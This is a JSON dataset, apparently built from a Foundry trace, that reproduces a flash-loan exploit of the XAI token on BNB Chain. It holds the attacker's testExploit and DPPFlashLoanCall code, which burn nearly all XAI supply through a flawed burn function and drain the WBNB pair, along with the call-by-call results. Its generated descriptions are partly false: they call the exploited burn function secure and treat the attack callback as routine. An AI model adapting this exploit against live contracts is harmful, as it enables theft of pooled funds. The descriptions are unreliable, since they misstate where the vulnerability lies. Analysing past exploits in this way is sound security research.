@@ -1,0 +1,303 @@
+[
+    {
+        "id": "463432",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n\n        XAI.approve(address(PancakeRouter), type(uint256).max);\n        DPPOracle.flashLoan(WBNB.balanceOf(address(DPPOracle)), 0, address(this), bytes(\"_\"));\n\n        emit log_named_decimal_uint(\n            \"Exploiter WBNB balance after attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to simulate an attack or exploit scenario. It first logs the attacker's WBNB (Wrapped Binance Coin) balance before the attack. Then, it approves the PancakeRouter to spend an unlimited amount of XAI tokens on behalf of the attacker. After that, it triggers a flash loan from the DPPOracle contract, borrowing the entire WBNB balance held by the DPPOracle. Finally, it logs the attacker's WBNB balance after the attack to show the impact of the exploit.\n\n2. Security mechanism:  \nThe function does not include explicit security mechanisms like access control or input validation. However, it relies on the underlying security of the `approve` and `flashLoan` functions from the XAI and DPPOracle contracts, respectively. The use of `type(uint256).max` for approval is a common practice to avoid repeated approvals but can be risky if not handled carefully. The function also emits events to log the attacker's WBNB balance before and after the attack, which can be useful for monitoring and debugging.\n\n3. Parameter Function:  \nThe function does not take any parameters. It operates using predefined contract addresses (`WBNB`, `XAI`, `PancakeRouter`, and `DPPOracle`) and hardcoded values. The `flashLoan` function is called with specific parameters: the entire WBNB balance of the DPPOracle, a zero value for the second parameter (likely representing no additional data), the attacker's address (`address(this)`), and an empty byte string (`bytes(\"_\")`).\n\n4. Return description:  \nThe function does not return any value. Instead, it emits two events (`log_named_decimal_uint`) to display the attacker's WBNB balance before and after the attack. These events provide a way to observe the changes in the attacker's balance as a result of the exploit.\n\nIn summary,  \nThe `testExploit` function simulates an attack by logging the attacker's WBNB balance, approving unlimited spending of XAI tokens, triggering a flash loan, and logging the updated balance. It lacks explicit security measures but relies on the underlying contracts' mechanisms. The function uses predefined addresses and hardcoded values, and it emits events to track the attacker's balance changes.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `balanceOf` function is designed to check and return the token balance of a specific account. It first checks if the account is excluded from certain features (like rewards or fees). If the account is excluded, it directly returns the balance stored in `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.\n\n2. **Security mechanism:**  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It is also marked as `view`, ensuring it does not modify the state of the contract, making it safe to call without incurring gas costs.  \n   - The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring consistency with the inherited logic.  \n\n3. **Parameter Function:**  \n   The function takes one parameter: `account`, which is the address of the user whose token balance is being queried. This parameter is essential for identifying the specific account and fetching its balance.  \n\n4. **Return description:**  \n   The function returns a `uint256` value representing the token balance of the specified account. If the account is excluded, it returns the balance directly from `_tOwned`. If not, it calculates the balance by converting the reflected balance (`_rOwned`) into actual tokens using the `tokenFromReflection` function.  \n\n**In summary,**  \nThe `balanceOf` function is a simple yet crucial utility that retrieves the token balance of a given account. It ensures accuracy by handling excluded accounts differently and uses reflection logic for non-excluded accounts. Its design prioritizes security and efficiency, making it a reliable part of the contract.",
+        "return_value": "0"
+    },
+    {
+        "id": "2444",
+        "args": "",
+        "original_code": "    function decimals() public view returns (uint256) {\n        return _DECIMALS;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `decimals()` function is a simple utility that provides information about the number of decimal places used by a token. This is important for understanding how the token's value is represented, especially when dealing with fractional amounts.\n\n2. Security mechanism:  \nThe function is marked as `public` and `view`, meaning it can be accessed by anyone but does not modify the state of the contract. This ensures that it is safe to call without any risk of altering the contract's data.\n\n3. Parameter Function:  \nThe function does not take any parameters. It simply retrieves and returns a predefined value stored in the `_DECIMALS` variable.\n\n4. Return description:  \nThe function returns the value of `_DECIMALS`, which is a constant or variable representing the number of decimal places for the token. This value is used to interpret the token's smallest unit.\n\nIn summary,  \nThe `decimals()` function is a straightforward utility that returns the number of decimal places for a token. It is safe to call, requires no input, and provides essential information for handling token values accurately.",
+        "return_value": "18"
+    },
+    {
+        "id": "25295",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `approve` function allows the caller (the owner of tokens) to give permission to another address (the `spender`) to spend a specific amount of tokens on their behalf. This is a common function in token contracts to enable delegated spending.\n\n2. **Security mechanism**:  \n   The function uses `public override`, which means it is publicly accessible and overrides a function from a parent contract. It also calls `_msgSender()`, which ensures the correct sender address is used, especially in cases where the contract is called through a proxy or other complex setups. This helps prevent impersonation or unauthorized access.\n\n3. **Parameter Function**:  \n   - `spender`: This is the address that is being granted permission to spend tokens.  \n   - `amount`: This is the maximum number of tokens the `spender` is allowed to use.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval was successful. The actual approval logic is handled internally by the `_approve` function, which updates the allowed spending limits for the `spender`.\n\nIn summary, the `approve` function is used to grant another address the ability to spend a specified amount of tokens on behalf of the caller. It ensures the correct sender is used and confirms the approval by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "2534",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2562001604398998683661 [2.562e21]"
+    },
+    {
+        "id": "410958",
+        "args": "2562001604398998683661 [2.562e21], 0, XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5f",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "25962",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2562001604398998683661 [2.562e21]",
+        "original_code": "    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+        "description": "1. **Core function**:  \n   The main purpose of this function is to transfer a specified amount of tokens from the sender's account to the recipient's account. It acts as a bridge to call an internal `_transfer` function, which handles the actual transfer logic.\n\n2. **Security mechanism**:  \n   - The function uses the `public` modifier, making it accessible to anyone.  \n   - It overrides a parent function (`override`), ensuring it adheres to a predefined interface or contract standard.  \n   - The `_msgSender()` function is used to securely fetch the sender's address, preventing potential manipulation.  \n\n3. **Parameter Function**:  \n   - `recipient`: This is the address of the person or contract that will receive the tokens.  \n   - `amount`: This specifies the number of tokens to be transferred from the sender to the recipient.  \n\n4. **Return description**:  \n   The function always returns `true` after successfully calling the internal `_transfer` function. This indicates that the transfer operation was executed as intended.  \n\n**In summary**, this function facilitates token transfers between two addresses, ensures secure sender identification, and confirms the success of the operation by returning `true`.",
+        "return_value": "true"
+    },
+    {
+        "id": "358653",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2562001604398998683661 [2.562e21], 0, 0x5f",
+        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNB.approve(address(PancakeRouter), type(uint256).max);\n        WBNBToXAI();\n        uint256 burnAmount = XAI.totalSupply() - 4596;\n        XAI.burn(burnAmount);\n        XAI_WBNB.sync();\n        XAIToWBNB();\n        WBNB.transfer(address(DPPOracle), baseAmount);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to handle a flash loan operation, which is a type of short-term borrowing in decentralized finance (DeFi). It performs several key actions:  \n   - Approves the transfer of WBNB (Wrapped Binance Coin) to a specific router (PancakeRouter) with no limit on the amount.  \n   - Converts WBNB into XAI (a token).  \n   - Calculates and burns a specific amount of XAI tokens to reduce the total supply.  \n   - Synchronizes the state of the XAI_WBNB pair.  \n   - Converts XAI back into WBNB.  \n   - Transfers a specified amount of WBNB to a designated oracle (DPPOracle).  \n\n2. **Security mechanism:**  \n   - The function uses `external` visibility, meaning it can only be called from outside the contract, which limits access.  \n   - It does not include explicit access control modifiers (e.g., `onlyOwner`), which could be a potential security risk if unauthorized users can trigger it.  \n   - The function relies on the integrity of external contracts (e.g., WBNB, XAI, PancakeRouter, DPPOracle) for its operations, so their security is critical.  \n\n3. **Parameter Function:**  \n   - `sender`: Represents the address initiating the flash loan.  \n   - `baseAmount`: Specifies the amount of WBNB to be transferred to the oracle.  \n   - `quoteAmount`: Likely represents the amount of another token involved in the operation, though it is not directly used in this function.  \n   - `data`: Additional data passed to the function, which is not utilized in this specific implementation.  \n\n4. **Return description:**  \n   This function does not return any value. It performs a series of actions (approval, token conversion, burning, synchronization, and transfer) but does not produce an output.  \n\n**In summary,**  \nThis function manages a flash loan process by converting tokens, burning a portion of the supply, and transferring funds to an oracle. It lacks explicit access control, relying on external contracts for security. The parameters define the sender, amounts, and additional data, but the function does not return any value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "24420",
+        "args": "PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2562001604398998683661 [2.562e21]"
+    },
+    {
+        "id": "207167",
+        "args": "2562001604398998683661 [2.562e21], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x570Ce7b89c67200721406525e1848bca6fF5A6F3], XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1700019887 [1.7e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8225",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], 2562001604398998683661 [2.562e21]",
+        "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"TOKEN20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `transferFrom` function is designed to move a specified amount of tokens from one account (`sender`) to another (`recipient`). It is commonly used in scenarios where a third party (like a smart contract or another user) is authorized to transfer tokens on behalf of the sender. This function ensures that the transfer is executed and adjusts the sender's allowance accordingly.\n\n2. Security mechanism:  \nThe function includes several security measures:  \n- It uses the `override` keyword to ensure it correctly implements a standard interface.  \n- It calls `_transfer` to handle the actual token transfer, which likely includes checks for valid addresses and sufficient balances.  \n- It uses `_approve` to reduce the sender's allowance for the caller (`_msgSender()`), ensuring the caller cannot transfer more tokens than they are allowed.  \n- The `sub` function is used with an error message to prevent transferring an amount that exceeds the approved allowance.  \n\n3. Parameter Function:  \n- `sender`: The address of the account sending the tokens.  \n- `recipient`: The address of the account receiving the tokens.  \n- `amount`: The number of tokens to be transferred.  \n\n4. Return description:  \nThe function returns `true` to indicate that the transfer was successful. This is a standard practice in such functions to confirm the operation completed without errors.  \n\nIn summary, the `transferFrom` function securely transfers tokens from one account to another while ensuring the caller does not exceed their approved allowance. It returns `true` to confirm the successful execution of the transfer.",
+        "return_value": "true"
+    },
+    {
+        "id": "13241",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000000000000 [1e29], 1090000000000000000 [1.09e18], 1700018878 [1.7e9]"
+    },
+    {
+        "id": "534",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2563091604398998683661 [2.563e21]"
+    },
+    {
+        "id": "169341",
+        "args": "99957366694852838737841696701 [9.995e28], 0, XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "98057",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99957366694852838737841696701 [9.995e28]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3241",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "43502994093751897288319708 [4.35e25]"
+    },
+    {
+        "id": "534",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2563091604398998683661 [2.563e21]"
+    },
+    {
+        "id": "3241",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "99956497005906248102711680291 [9.995e28]"
+    },
+    {
+        "id": "550",
+        "args": "",
+        "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _tTotal;\n    }\n\n",
+        "description": "1. **Core function**:  \n   The `totalSupply` function is designed to provide the total number of tokens that exist in the system. It acts as a simple way to check the overall supply of tokens at any given time.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It uses the `view` modifier, which ensures that the function does not modify the state of the contract, making it safe to call without incurring gas costs.  \n   - The `override` keyword indicates that this function is overriding a function from a parent contract, ensuring consistency with the expected behavior.  \n\n3. **Parameter Function**:  \n   This function does not take any parameters. It simply retrieves and returns the value of `_tTotal`, which represents the total token supply.  \n\n4. **Return description**:  \n   The function returns the value of `_tTotal`, which is a variable storing the total number of tokens in the system. No calculations are performed; it directly provides the stored value.  \n\n**In summary**, the `totalSupply` function is a straightforward way to access the total token supply in the system, with security measures ensuring it is safe and efficient to use.",
+        "return_value": "100000000000000000000000000000 [1e29]"
+    },
+    {
+        "id": "6920",
+        "args": "99999999999999999999999995404 [9.999e28]",
+        "original_code": "\tfunction burn(uint256 _value) public{\n\t\t_burn(msg.sender, _value);\n\t}\n\t\n\tfunction updateFee(uint256 _txFee,uint256 _burnFee,uint256 _charityFee) onlyOwner() public{\n        _TAX_FEE = _txFee* 100; \n        _BURN_FEE = _burnFee * 100;\n\t\t_CHARITY_FEE = _charityFee* 100;\n\t\tORIG_TAX_FEE = _TAX_FEE;\n\t\tORIG_BURN_FEE = _BURN_FEE;\n\t\tORIG_CHARITY_FEE = _CHARITY_FEE;\n\t}\n\t\n\n\tfunction _burn(address _who, uint256 _value) internal {\n\t\trequire(_value <= _rOwned[_who]);\n\t\t_rOwned[_who] = _rOwned[_who].sub(_value);\n\t\t_tTotal = _tTotal.sub(_value);\n\t\temit Transfer(_who, address(0), _value);\n\t}\n\n\n",
+        "description": "1. Core functions:\n   - The `burn` function allows a user to destroy a specified amount of tokens from their own balance. This reduces the total supply of tokens in circulation.\n   - The `updateFee` function is used to set or update the fees for transactions, burning, and charity. These fees are stored as percentages and are used in various operations within the contract.\n   - The `_burn` function is an internal function that performs the actual burning of tokens. It checks if the user has enough tokens to burn, reduces the user's balance, and decreases the total supply of tokens.\n\n2. Security mechanism:\n   - The `burn` function is public, meaning anyone can call it, but it only affects the caller's own tokens.\n   - The `updateFee` function is protected by the `onlyOwner` modifier, ensuring that only the contract owner can change the fee rates.\n   - The `_burn` function includes a `require` statement to ensure that the user cannot burn more tokens than they own, preventing unauthorized or excessive token destruction.\n\n3. Parameter Function:\n   - In the `burn` function, `_value` specifies the number of tokens the caller wants to burn.\n   - In the `updateFee` function, `_txFee`, `_burnFee`, and `_charityFee` are the new fee rates for transactions, burning, and charity, respectively. These values are multiplied by 100 to store them as percentages.\n   - In the `_burn` function, `_who` is the address of the user whose tokens are being burned, and `_value` is the number of tokens to burn.\n\n4. Return description:\n   - The `burn` and `_burn` functions do not return any value; they simply perform the burning operation and emit an event to log the action.\n   - The `updateFee` function also does not return any value; it updates the internal state variables that store the fee rates.\n\nIn summary, these functions manage the burning of tokens and the updating of fee rates within the contract. The `burn` function allows users to destroy their own tokens, while the `updateFee` function lets the owner set new fee rates. The `_burn` function handles the actual token burning process, ensuring that users cannot burn more tokens than they own. Security measures include restricting fee updates to the contract owner and preventing excessive token burning.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "11687",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3241",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1"
+    },
+    {
+        "id": "534",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2563091604398998683661 [2.563e21]"
+    },
+    {
+        "id": "3241",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4594"
+    },
+    {
+        "id": "87931",
+        "args": "4594, 0, [0x570Ce7b89c67200721406525e1848bca6fF5A6F3, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1700019887 [1.7e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "34622",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B], 4594",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1, 2563091604398998683661 [2.563e21], 1700018887 [1.7e9]"
+    },
+    {
+        "id": "3241",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4595"
+    },
+    {
+        "id": "40965",
+        "args": "0, 2562532406577152568030 [2.562e21], XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23162",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2562532406577152568030 [2.562e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3241",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4595"
+    },
+    {
+        "id": "534",
+        "args": "XAI_WBNB: [0xe633c651e6B3F744e7DeD314CDb243cf606A5F5B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "559197821846115631 [5.591e17]"
+    },
+    {
+        "id": "534",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2562532406577152568030 [2.562e21]"
+    },
+    {
+        "id": "3262",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 2562001604398998683661 [2.562e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2562001604398998683661 [2.562e21]"
+    },
+    {
+        "id": "2531",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3408695997235812889583 [3.408e21]"
+    },
+    {
+        "id": "534",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2562001604398998683661 [2.562e21]"
+    },
+    {
+        "id": "531",
+        "args": "DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3408695997235812889583 [3.408e21]"
+    },
+    {
+        "id": "534",
+        "args": "XAIExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "530802178153884369 [5.308e17]"
+    },
+    {
+        "id": "444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
